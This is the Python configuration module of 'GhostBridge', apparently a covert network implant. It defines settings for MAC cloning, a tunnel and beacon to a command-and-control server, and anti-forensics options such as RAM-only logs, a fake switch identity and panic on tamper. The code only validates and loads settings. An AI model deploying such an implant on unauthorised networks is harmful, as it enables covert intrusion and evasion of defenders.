"""
GhostBridge Configuration Module

Pydantic-based configuration management with support for:
- YAML configuration files
- Environment variable overrides
- Runtime validation
"""

from __future__ import annotations

import os
from pathlib import Path

import yaml
from pydantic import BaseModel, Field, field_validator
from pydantic_settings import BaseSettings, SettingsConfigDict


class DeviceConfig(BaseModel):
    """Device identification configuration."""

    id: str = Field(default="ghost-001", description="Unique device identifier")
    name: str = Field(default="GhostBridge Device", description="Human-readable device name")


class NetworkConfig(BaseModel):
    """Network bridge configuration."""

    bridge_name: str = Field(default="br0", description="Linux bridge interface name")
    wan_interface: str = Field(default="eth0", description="WAN interface (to wall port)")
    lan_interface: str = Field(default="eth1", description="LAN interface (to target device)")
    clone_mac: bool = Field(default=True, description="Clone MAC address from target")

    @field_validator("bridge_name", "wan_interface", "lan_interface")
    @classmethod
    def validate_interface_name(cls, v: str) -> str:
        """Validate interface names."""
        if not v or len(v) > 15:
            raise ValueError("Interface name must be 1-15 characters")
        if not v.replace("-", "").replace("_", "").isalnum():
            raise ValueError("Interface name must be alphanumeric with - or _")
        return v


class TunnelConfig(BaseModel):
    """VPN tunnel configuration."""

    type: str = Field(default="wireguard", description="Tunnel type")
    interface: str = Field(default="wg0", description="Tunnel interface name")
    endpoint: str = Field(default="", description="C2 server endpoint (host:port)")
    keepalive: int = Field(default=25, ge=0, le=300, description="Keepalive interval in seconds")
    reconnect_delays: list[int] = Field(
        default=[5, 10, 30, 60, 300],
        description="Reconnection delay sequence in seconds",
    )

    @field_validator("type")
    @classmethod
    def validate_tunnel_type(cls, v: str) -> str:
        """Validate tunnel type."""
        allowed = {"wireguard", "openvpn", "ssh", "cloudflare"}
        if v.lower() not in allowed:
            raise ValueError(f"Tunnel type must be one of: {allowed}")
        return v.lower()


class BeaconConfig(BaseModel):
    """C2 beacon configuration."""

    enabled: bool = Field(default=True, description="Enable beacon service")
    interval: int = Field(default=300, ge=10, le=86400, description="Beacon interval in seconds")
    jitter: int = Field(default=60, ge=0, le=300, description="Random jitter in seconds")


class C2Config(BaseModel):
    """Command & Control server configuration."""

    api_endpoint: str = Field(
        default="http://10.66.66.1:8082/api/ghostbridge",
        description="MoMo API endpoint",
    )
    timeout: int = Field(default=30, ge=5, le=300, description="API timeout in seconds")
    verify_ssl: bool = Field(default=True, description="Verify SSL certificates")


class StealthConfig(BaseModel):
    """Anti-forensics and stealth configuration."""

    ramfs_logs: bool = Field(default=True, description="Store logs in RAM only")
    fake_identity: str = Field(
        default="Netgear GS105",
        description="Fake device identity for probes",
    )
    panic_on_tamper: bool = Field(default=True, description="Trigger panic on tamper detection")


class LoggingConfig(BaseModel):
    """Logging configuration."""

    level: str = Field(default="WARNING", description="Log level")
    to_disk: bool = Field(default=False, description="Write logs to disk (not recommended)")
    max_lines: int = Field(default=1000, ge=100, le=10000, description="Max log lines in memory")

    @field_validator("level")
    @classmethod
    def validate_log_level(cls, v: str) -> str:
        """Validate log level."""
        allowed = {"DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"}
        if v.upper() not in allowed:
            raise ValueError(f"Log level must be one of: {allowed}")
        return v.upper()


class GhostBridgeConfig(BaseSettings):
    """
    Main GhostBridge configuration.

    Configuration is loaded from:
    1. Default values
    2. YAML configuration file
    3. Environment variables (prefixed with GHOSTBRIDGE_)
    """

    model_config = SettingsConfigDict(
        env_prefix="GHOSTBRIDGE_",
        env_nested_delimiter="__",
        case_sensitive=False,
    )

    device: DeviceConfig = Field(default_factory=DeviceConfig)
    network: NetworkConfig = Field(default_factory=NetworkConfig)
    tunnel: TunnelConfig = Field(default_factory=TunnelConfig)
    beacon: BeaconConfig = Field(default_factory=BeaconConfig)
    c2: C2Config = Field(default_factory=C2Config)
    stealth: StealthConfig = Field(default_factory=StealthConfig)
    logging: LoggingConfig = Field(default_factory=LoggingConfig)

    @classmethod
    def from_yaml(cls, path: str | Path) -> GhostBridgeConfig:
        """
        Load configuration from a YAML file.

        Args:
            path: Path to YAML configuration file

        Returns:
            GhostBridgeConfig instance

        Raises:
            FileNotFoundError: If config file doesn't exist
            ValueError: If config file is invalid
        """
        path = Path(path)
        if not path.exists():
            raise FileNotFoundError(f"Configuration file not found: {path}")

        with open(path, encoding="utf-8") as f:
            data = yaml.safe_load(f) or {}

        return cls(**data)

    @classmethod
    def load(cls, config_path: str | Path | None = None) -> GhostBridgeConfig:
        """
        Load configuration with fallback order:
        1. Provided path
        2. GHOSTBRIDGE_CONFIG environment variable
        3. /etc/ghostbridge/config.yml
        4. Default values

        Args:
            config_path: Optional path to configuration file

        Returns:
            GhostBridgeConfig instance
        """
        # Try provided path
        if config_path:
            return cls.from_yaml(config_path)

        # Try environment variable
        env_path = os.environ.get("GHOSTBRIDGE_CONFIG")
        if env_path and Path(env_path).exists():
            return cls.from_yaml(env_path)

        # Try default path
        default_path = Path("/etc/ghostbridge/config.yml")
        if default_path.exists():
            return cls.from_yaml(default_path)

        # Return default configuration
        return cls()

    def to_yaml(self, path: str | Path) -> None:
        """
        Save configuration to a YAML file.

        Args:
            path: Path to save configuration
        """
        path = Path(path)
        path.parent.mkdir(parents=True, exist_ok=True)

        data = self.model_dump()
        with open(path, "w", encoding="utf-8") as f:
            yaml.safe_dump(data, f, default_flow_style=False, sort_keys=False)

    def get_bridge_interfaces(self) -> tuple[str, str, str]:
        """
        Get bridge interface names.

        Returns:
            Tuple of (bridge_name, wan_interface, lan_interface)
        """
        return (
            self.network.bridge_name,
            self.network.wan_interface,
            self.network.lan_interface,
        )

